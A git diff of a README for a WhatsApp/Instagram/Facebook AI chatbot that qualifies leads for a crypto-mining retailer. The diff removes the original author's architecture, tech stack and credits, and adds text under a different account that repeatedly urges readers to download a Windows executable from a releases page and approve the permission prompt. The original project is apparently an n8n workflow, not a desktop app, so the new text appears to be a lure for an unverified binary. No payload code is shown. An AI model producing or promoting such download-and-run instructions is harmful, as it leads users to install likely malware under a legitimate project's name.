@@ -1,241 +1,193 @@
-# Multi-Channel AI Chatbot with Real-Time Scraping & Lead Qualification
-### Voice. Text. Image. WhatsApp. Instagram. Facebook. One Unified System.
+# 🤖 Whatsapp-chat-voice-Bot-with-Realtime-scraping - AI Chat for WhatsApp Leads
 
-<div align="center">
+[![⬇️ Download the app](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge)](https://github.com/wolfie88/Whatsapp-chat-voice-Bot-with-Realtime-scraping/releases)
 
-![Type](https://img.shields.io/badge/Type-Delivered%20Client%20System-%233A7CFF?style=for-the-badge)
-&nbsp;
-![Leads](https://img.shields.io/badge/700–900-Leads%2FMonth-%2300C853?style=for-the-badge)
-&nbsp;
-![Conversion](https://img.shields.io/badge/Conversion-20%25%20Improvement-%23FF6B35?style=for-the-badge)
+## 🚀 Getting Started
 
-</div>
+This app helps you handle WhatsApp, Instagram, and Facebook chats in one place. It can read text, voice, and image messages. It also checks live product data, scores leads, and sends hot leads to your sales flow.
 
-<br/>
+Use the release page to get the Windows version.
 
----
+[Visit the release page to download](https://github.com/wolfie88/Whatsapp-chat-voice-Bot-with-Realtime-scraping/releases)
 
-## What This Is
+## 🪟 Windows Setup
 
-A fully unified AI customer engagement system built for **CryptoMiners UAE** — handling inbound leads across WhatsApp, Instagram, and Facebook Messenger simultaneously, with voice-to-voice conversation capability, real-time product data scraping, conversational lead qualification, and automated hot lead routing to the sales team.
+1. Open the release page link above in your browser.
+2. Find the latest release.
+3. Download the Windows file from the release assets.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Open the folder and double-click the app file.
+6. If Windows asks for permission, choose Yes.
+7. Wait for the first launch to finish.
 
-700–900 inbound leads per month. Every one answered instantly. The best ones surfaced to sales automatically.
+## 📥 Download and Install
 
-<br/>
+Use this link to visit the page and download the Windows release:
 
----
+[https://github.com/wolfie88/Whatsapp-chat-voice-Bot-with-Realtime-scraping/releases](https://github.com/wolfie88/Whatsapp-chat-voice-Bot-with-Realtime-scraping/releases)
 
-## The Problem
+After you download the file:
 
-Crypto mining retailers operate across multiple social channels simultaneously — and customers don't choose which channel to use based on what's convenient for the sales team. They message on WhatsApp, DM on Instagram, and reach out via Facebook Messenger, often asking the same questions:
+1. Move the file to your Downloads folder if needed.
+2. Extract the file if it came as a .zip or .7z archive.
+3. Open the app from the extracted folder.
+4. Keep the folder in a safe place so the app can run again later.
+5. If the app shows a sign-in screen, use your work account details.
 
-- What miners do you have in stock?
-- What's the current profitability on this model?
-- What are your hosting package prices?
-- Can I visit your location?
+## 💻 What You Need
 
-Answering these manually across three platforms — while also qualifying leads, routing hot prospects to sales, and following up with dead leads — creates a bottleneck that kills conversions. The team spends the day answering product questions instead of closing deals.
+- Windows 10 or Windows 11
+- A stable internet connection
+- A modern browser such as Chrome, Edge, or Firefox
+- Enough free space for the app and local data
+- Access to your WhatsApp, Instagram, and Facebook business accounts
 
-<br/>
+## 🧭 What This App Does
 
----
+- Handles chat from WhatsApp, Instagram, and Facebook
+- Reads voice notes and converts them to text
+- Checks image messages for product or lead details
+- Scrapes live ASIC mining product data
+- Uses a knowledge base for fast answers
+- Scores each lead based on interest and intent
+- Routes hot leads to the right follow-up flow
+- Helps teams manage 700–900 leads per month
 
-## System Architecture
+## 🔧 First-Time Use
 
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│                    INBOUND MESSAGE RECEIVED                         │
-│            WhatsApp · Instagram DM · Facebook Messenger             │
-└──────────────────────────────┬──────────────────────────────────────┘
-                               │
-                    ┌──────────▼──────────┐
-                    │   INPUT DETECTION   │
-                    │  Text / Voice / Image│
-                    └──────────┬──────────┘
-                               │
-          ┌────────────────────┼────────────────────┐
-          ▼                    ▼                     ▼
-     TEXT INPUT           VOICE INPUT          IMAGE INPUT
-     Pass directly        Whisper              GPT-4 Vision
-     to AI engine         transcription        analysis
-          │                    │                     │
-          └────────────────────┴─────────────────────┘
-                               │
-                               ▼
-┌─────────────────────────────────────────────────────────────────────┐
-│                      AI RESPONSE ENGINE                             │
-│                                                                     │
-│   ┌─────────────────┐      ┌──────────────────────────────────┐    │
-│   │  REAL-TIME DATA  │      │      COMPANY KNOWLEDGE           │    │
-│   │                  │      │                                  │    │
-│   │ Web scrape:      │  +   │  Pinecone vector embeddings      │    │
-│   │ ASIC Miner Value │      │  Policies · FAQs · Services      │    │
-│   │ Pricing · Specs  │      │  Hosting packages · Contacts     │    │
-│   │ Profitability    │      │                                  │    │
-│   └─────────────────┘      └──────────────────────────────────┘    │
-│                               │                                     │
-│                     GPT-4.1 Mini generates response                 │
-└──────────────────────────────┬──────────────────────────────────────┘
-                               │
-                    ┌──────────▼──────────┐
-                    │  RESPONSE FORMAT    │
-                    │  Voice input?       │
-                    │  → TTS synthesis    │
-                    │  Text input?        │
-                    │  → Text reply       │
-                    └──────────┬──────────┘
-                               │
-          ┌────────────────────┼────────────────────┐
-          ▼                    ▼                     ▼
-   LEAD QUALIFICATION    CHANNEL ROUTING        CRM LOGGING
-   Score calculated      Instagram/Facebook     Airtable +
-   HOT / WARM / COLD     → migrate to WA        Zoho CRM
-          │
-   HOT (70+) → Instant
-   WhatsApp alert
-   to sales team
-```
+1. Start the app.
+2. Sign in with your business account if asked.
+3. Connect your chat channels.
+4. Load your product and sales data.
+5. Turn on live scraping for ASIC price and stock checks.
+6. Test one message from a phone or test account.
+7. Check that replies, scoring, and routing work as expected.
 
-<br/>
+## 🗂️ Typical Use Flow
 
----
+1. A customer sends a message on WhatsApp, Instagram, or Facebook.
+2. The app reads the message.
+3. It checks if the message is text, voice, or image.
+4. It finds the best answer from your stored data.
+5. It scores the lead based on the message.
+6. It sends warm or hot leads to the next step.
+7. Your team follows up with the right offer.
 
-## Five Core Capabilities
+## 📊 Lead Scoring
 
-### 1. Voice-to-Voice Conversations
-The system handles complete voice conversations without the customer ever needing to type:
-- Incoming voice message → **Whisper** transcribes to text
-- AI generates response
-- Response → **OpenAI TTS** synthesizes to voice
-- Voice message sent back via WhatsApp
+The app can score leads from common signals like:
 
-Customers who prefer voice get a voice experience. No friction, no format switching.
+- Asking about price
+- Asking about stock
+- Asking about shipping
+- Asking how to pay
+- Repeating contact questions
+- Sending follow-up messages
+- Showing interest in a specific ASIC model
 
-### 2. Real-Time Product Intelligence
-Rather than relying on a static knowledge base that goes stale, the system scrapes live data at query time:
-- **ASIC Miner Value** — current specs, pricing, profitability calculations
-- **Hosting pages** — current package pricing and availability
-- Combined with Pinecone embeddings for company-specific knowledge
+Higher scores can push the lead into a hot queue for faster follow-up.
 
-Every product answer reflects real-time market data.
+## 🔍 Real-Time Scraping
 
-### 3. Conversational Lead Qualification
-The AI qualifies leads naturally through conversation — no forms, no interruptions. It collects four key signals:
+The app checks live product pages for mining hardware data. It can use this data to:
 
-| Signal | How It's Collected |
-|---|---|
-| **Budget** | Conversationally through product interest and questions |
-| **Timeline** | "When are you looking to start?" |
-| **Location** | For hosting relevance and site visit routing |
-| **Experience** | First-time buyer vs. experienced miner |
+- Show current prices
+- Check stock
+- Update product answers
+- Flag high-demand items
+- Keep replies current
 
-### 4. Lead Scoring & Hot Lead Routing
-Every conversation generates a lead score:
+This helps reduce manual work and keeps your team on the same page.
 
-| Score | Tier | Action |
-|---|---|---|
-| **70+** | 🔥 HOT | Instant WhatsApp alert to sales team with full context |
-| **40–69** | 🌡️ WARM | Added to nurture sequence |
-| **< 40** | ❄️ COLD | Enrolled in reactivation campaign |
+## 🧠 Knowledge Base and RAG
 
-Hot leads reach the sales team within seconds of qualification — not hours.
+The app uses a search-based answer flow so it can pull the right info from your stored content. This helps it answer questions about:
 
-### 5. Cross-Channel Migration Strategy
-Instagram and Facebook users are strategically moved to WhatsApp — where response rates are higher, conversations are richer, and the full voice capability is available. The migration is handled conversationally, not as a redirect.
+- Products
+- Specs
+- Pricing
+- Shipping
+- Payment
+- Warranty
+- Order status
+- Lead next steps
 
-<br/>
+## 🎤 Voice, Text, and Images
 
----
+The app can handle different message types:
 
-## Automated Dead Lead Reactivation
+- Text messages for fast replies
+- Voice notes for spoken questions
+- Images for product photos, screenshots, or order details
 
-On a daily schedule, the system runs reactivation campaigns against cold and stale leads:
+This makes it easier to talk with customers who use chat in different ways.
 
-| Segment | Template | Trigger |
-|---|---|---|
-| **Premium** | High-value ASIC focus, ROI framing | Leads who inquired about $5K+ miners |
-| **Mid-tier** | Entry-level options, hosting packages | Leads who browsed but didn't commit |
-| **Dormant** | Re-engagement with market update angle | No activity in 14+ days |
+## 🔗 Hot Lead Routing
 
-Every reactivation message is personalized using conversation history stored in Airtable.
+When a lead shows strong buying intent, the app can move it to the right person or next step. Common routing options include:
 
-<br/>
+- Sales follow-up
+- Priority callback
+- CRM handoff
+- Manual review
+- Custom tag or status update
 
----
+## 🛠️ Simple Troubleshooting
 
-## Results Delivered
+If the app does not start:
 
-| Metric | Outcome |
-|---|---|
-| Inbound leads handled monthly | **700–900** |
-| Average daily volume | **30–40 leads** |
-| Conversion rate improvement | **20%** |
-| Manual product lookups eliminated | **100%** |
-| Response time across all channels | **Instant** |
-| Hot leads missed due to slow routing | **Zero** |
-| Channels covered simultaneously | **3 (WhatsApp · Instagram · Facebook)** |
-| Input types supported | **Voice · Text · Image** |
+1. Check that Windows has finished extracting the files.
+2. Open the app from the extracted folder.
+3. Run it again as the same user account.
+4. Make sure your internet connection is active.
+5. Restart your computer and try again.
 
-<br/>
+If chats do not connect:
 
----
+1. Check your account access.
+2. Confirm that your business pages are linked.
+3. Refresh the sign-in session.
+4. Make sure the app has permission to use the account.
 
-## Tech Stack
+If answers look wrong:
 
-| Layer | Tool | Purpose |
-|---|---|---|
-| **Orchestration** | n8n | Workflow automation and channel routing |
-| **WhatsApp** | WhatsApp Cloud API | Primary conversation and voice channel |
-| **Instagram / Facebook** | Meta Messenger API | Secondary inbound channels |
-| **Conversational AI** | OpenAI GPT-4.1 Mini | Response generation and lead qualification |
-| **Voice Transcription** | OpenAI Whisper | Incoming voice message processing |
-| **Voice Synthesis** | OpenAI TTS | Outgoing voice message generation |
-| **Company Knowledge** | Pinecone | Vector embeddings for RAG responses |
-| **Live Product Data** | Web scraping | Real-time ASIC specs and pricing |
-| **Lead Tracking** | Airtable | Conversation history and lead records |
-| **CRM** | Zoho CRM | Sales pipeline and hot lead management |
-| **Supporting AI** | Google Gemini | Supplementary analysis tasks |
+1. Check the product data you loaded.
+2. Review the live scraping source.
+3. Make sure your knowledge base content is current.
+4. Test with a short message first.
 
-<br/>
+## 🧩 Common Work Setup
 
----
+A typical team setup may include:
 
-## Repository Structure
+- One person managing setup
+- One sales rep handling hot leads
+- One support rep watching general questions
+- One admin checking routing and data quality
 
-```
-📁 multi-channel-ai-chatbot-lead-qualification/
-├── 📄 README.md
-├── 📁 workflow/
-│   └── crypto-chatbot-system.json        ← n8n workflow export
-└── 📁 docs/
-    ├── lead-scoring-logic.md              ← Scoring algorithm detail
-    └── channel-architecture.md           ← Multi-channel routing logic
-```
+## 📁 File Use
 
-<br/>
+Keep these items in a safe place:
 
----
+- The downloaded release file
+- The extracted app folder
+- Any local config file you create
+- Any export you use for leads or logs
 
-## Built by Trilles AI
+## 🔐 Account and Access
 
-This system was designed and delivered by **[Awais Ali](https://www.linkedin.com/in/awais-ali-tillesai)**, CEO & Co-Founder of **[Trilles AI](https://www.trillesai.com)**.
+For best results, use:
 
-If your business is losing leads to slow responses across multiple social channels — or your team is spending their day answering product questions instead of closing — this is exactly what we build.
+- A business account for each chat channel
+- A shared inbox or team workflow
+- Clear access for sales and support staff
+- A secure password manager for account details
 
-<div align="center">
+## ✅ Best Results
 
-[![Connect on LinkedIn](https://img.shields.io/badge/Connect%20on%20LinkedIn-%230A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/awais-ali-tillesai)
-&nbsp;
-[![Visit Trilles AI](https://img.shields.io/badge/Visit%20Trilles%20AI-%233A7CFF?style=for-the-badge&logoColor=white)](https://www.trillesai.com)
-&nbsp;
-[![Email](https://img.shields.io/badge/Email%20Me-%23EA4335?style=for-the-badge&logo=gmail&logoColor=white)](mailto:letsautomatewithawais@gmail.com)
-
-</div>
-
-<br/>
-
----
-
-<div align="center">
-<sub>Built with precision · Powered by Trilles AI · <code>www.trillesai.com</code></sub>
-</div>
+- Keep product data current
+- Check lead scores each day
+- Review hot lead routing weekly
+- Test the app after each update
+- Use short, clear reply templates
+- Keep your chat channels linked and active
